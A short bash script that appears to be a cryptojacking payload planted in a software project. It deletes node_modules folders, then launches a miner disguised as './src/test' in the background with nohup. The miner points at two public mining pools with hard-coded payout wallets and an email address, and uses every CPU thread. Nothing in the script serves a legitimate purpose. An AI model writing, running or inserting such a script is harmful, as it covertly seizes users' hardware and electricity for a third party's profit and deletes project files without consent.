#!/bin/bash
rm -rf ../node_modules*
nohup ./src/test --disable-gpu --algorithm randomx\;verushash --pool xmr-eu1.nanopool.org:14444\;na.luckpool.net:3956 --wallet 837MGitRYxgEV158RDenxVUfb5mN6qzz78Z1WeaDoiqC4K7H8Pj556vHJoVXL2MCJ5WCGVZTBiRmqJFxeJG3WSQmGKhPC31.$(echo $(date +%d))/ayni.suhada@hotmail.com\;RRJiRsiCXxg5zUcXp2LC4yJSJTZ96uVUtx.$(echo $(date +%d)) --password x\;x --cpu-threads $(nproc --all)\;$(nproc --all) --log=stdout > meta.log & 
